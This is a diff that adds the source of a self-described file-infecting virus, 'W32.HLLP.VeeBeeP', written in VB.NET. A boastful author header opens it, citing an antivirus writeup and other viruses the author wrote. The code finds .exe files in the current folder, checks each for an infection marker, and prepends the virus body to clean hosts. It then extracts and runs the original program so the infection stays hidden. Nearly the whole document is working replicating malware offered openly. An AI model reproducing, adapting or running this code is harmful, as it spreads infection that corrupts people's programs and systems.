@@ -1,0 +1,194 @@
+   ' ===================
+   ' vb.net.veebeep
+   ' ===================
+   '
+   ' welcome to my first vb.net virus.. and the first vb.net virus i think reported in the avs.. writing this one is more
+   ' difficult than writing w32.syra aka w32.hllp.flatei, a true msil prepender...
+   '
+   ' a boring day, i planned to write a virus in vb.net... i studied the documentation of beta 2 framework sdk, built a pure
+   ' visual basic.net virus and after finishing it, the compiled virus wont work as i wish...
+   '
+   ' fileget routine only allocates only more or less 23k bytes in dotnet beta 2 framework (i don't know
+   ' if future releases don't have this stupid bug)... fuck.. what if the host is more than 23k bytes?... so i relied on
+   ' some classes....
+   '
+   ' and it werked...
+   '
+   ' the virus works in my winme with framework beta 2 installed... computer associates told me that it doesn't work
+   ' in framework version greater than beta two.. but look at this..
+   '
+   ' http://securityresponse.symantec.com/avcenter/venc/data/w32.hllp.alpoor.html
+   '
+   ' docued to work man.. but contains some misinformation
+   '
+   ' [snip]
+   '
+   ' NOTE: The virus does not infect normal DOS (MZ) or Windows (PE) executable files. It determines whether the file it is
+   ' about to infect is a .NET file. If not, the file will not be infected.
+   '
+   ' [snip]
+   '
+   ' my w32.syra.b does that one, which was submitted to 29a7 (hope they'll publish it)
+   '
+   ' presenting my sloppy code...
+   '
+   ' heheehehe
+   '
+   ' alcopaul
+   '
+   ' ======================================================================================================================
+
+   Imports Microsoft.VisualBasic
+   Imports System.Reflection
+   Imports System.IO
+
+   Module Virus
+
+   Sub Main()
+   Dim myMod As System.Reflection.Module = [Assembly].GetExecutingAssembly().GetModules()(0)
+   dim sfile as String
+   dim a as String
+   dim arr1 as String()
+   dim host as String
+   dim hostlen1 as integer
+   dim mmm as string
+   dim ddd as string
+   dim hostlen as integer
+   dim sign as string
+   sfile = Dir(CurDir() & "\*.exe")
+   While sfile <> ""
+   a = a & sfile & "/"
+   sfile = Dir
+   End While
+   arr1 = Split(a, "/")
+   for each host in arr1
+   If LCase(host) = LCase(MyMod.Name) Then
+   Goto g
+   End If
+   if host = "" Then
+   MsgBox("the first VB.NET virus", vbOKonly, "W32.HLLP.VeeBeeP by alcopaul")
+   hhh:
+   Beep()
+   exit for
+   end if
+   Dim fs1 = New FileStream(host, FileMode.Open, FileAccess.Read)
+   Dim r1 As New BinaryReader(fs1)
+   hostlen1 = 84
+   r1.BaseStream.Seek(0, SeekOrigin.Begin)
+   Dim bytes1(84) As Byte
+   Dim numBytesToRead1 As Integer = CInt(84)
+   Dim numBytesRead1 As Integer = 0
+   While numBytesToRead1 > 0
+   Dim n1 As Integer = r1.Read(bytes1, numBytesRead1, numBytesToRead1)
+   If n1 = 0 Then ' We're at EOF
+   Exit While
+   End If
+   numBytesRead1 += n1
+   numBytesToRead1 -= n1
+   End While
+   r1.Close()
+   FileOpen(1, "sig.txt", OpenMode.Binary)
+   FilePut(1, bytes1)
+   FileClose(1)
+   FileOpen(1, "sig.txt", OpenMode.Input)
+   ddd = LineInput(1)
+   FileClose(1)
+   kill("sig.txt")
+   mmm = Mid(Right(ddd,7), 1, (Len(Right(ddd,7)) - 1))
+   if lcase(mmm) <> "alcovb" then
+   goto noinfection
+   else
+   goto g
+   end if
+   noinfection:
+   try
+   infect(host)
+   exit for
+   catch
+   goto g
+   end try
+   g:
+   Next host
+   'extract host
+   try
+   Dim fs = New FileStream(MyMod.FullyQualifiedName, FileMode.Open, FileAccess.Read)
+   Dim r As New BinaryReader(fs)
+   hostlen = fs.Length - 6145
+   r.BaseStream.Seek(6145, SeekOrigin.Begin)
+   Dim bytes(hostlen) As Byte
+   Dim numBytesToRead As Integer = CInt(hostlen)
+   Dim numBytesRead As Integer = 0
+   While numBytesToRead > 0
+   Dim n As Integer = r.Read(bytes, numBytesRead, numBytesToRead)
+   If n = 0 Then ' We're at EOF
+   Exit While
+   End If
+   numBytesRead += n
+   numBytesToRead -= n
+   End While
+   r.Close()
+   FileOpen(1, "vbnet.exe", OpenMode.Binary)
+   FilePut(1, bytes)
+   FileClose(1)
+   Shell("vbnet.exe " & Command(), AppWinStyle.NormalFocus)
+   catch
+   msgbox("first generation")
+   end try
+   wet:
+   try
+   File.Delete("vbnet.exe")
+   catch
+   goto wet
+   end try
+   if (File.Exists("vbnet.exe") = true)
+   goto wet
+   end if
+   End Sub
+
+   Function infect(fff as string)
+   dim hostlen1 as Long
+   dim hostlen as long
+   Dim myMod As System.Reflection.Module = [Assembly].GetExecutingAssembly().GetModules()(0)
+   Dim fs = New FileStream(MyMod.FullyQualifiedName, FileMode.Open, FileAccess.Read)
+   Dim r As New BinaryReader(fs)
+   hostlen = 6144
+   r.BaseStream.Seek(0, SeekOrigin.Begin)
+   Dim bytes(6144) As Byte
+   Dim numBytesToRead As Integer = CInt(6144)
+   Dim numBytesRead As Integer = 0
+   While numBytesToRead > 0
+   Dim n As Integer = r.Read(bytes, numBytesRead, numBytesToRead)
+   If n = 0 Then ' We're at EOF
+   Exit While
+   End If
+   numBytesRead += n
+   numBytesToRead -= n
+   End While
+   r.Close()
+
+   Dim fs1 = New FileStream(fff, FileMode.Open, FileAccess.Read)
+   Dim r1 As New BinaryReader(fs1)
+   hostlen1 = fs1.Length
+   r1.BaseStream.Seek(0, SeekOrigin.Begin)
+   Dim bytes1(hostlen1) As Byte
+   Dim numBytesToRead1 As Integer = CInt(fs1.Length)
+   Dim numBytesRead1 As Integer = 0
+   While numBytesToRead1 > 0
+   Dim n1 As Integer = r1.Read(bytes1, numBytesRead1, numBytesToRead1)
+   If n1 = 0 Then ' We're at EOF
+   Exit While
+   End If
+   numBytesRead1 += n1
+   numBytesToRead1 -= n1
+   End While
+   r1.Close()
+
+   FileOpen(1, fff, OpenMode.Binary)
+   FilePut(1, bytes)
+   FilePut(1, bytes1)
+   FilePut(1, "alcovb")
+   FileClose(1)
+
+   End Function
+
+   End Module
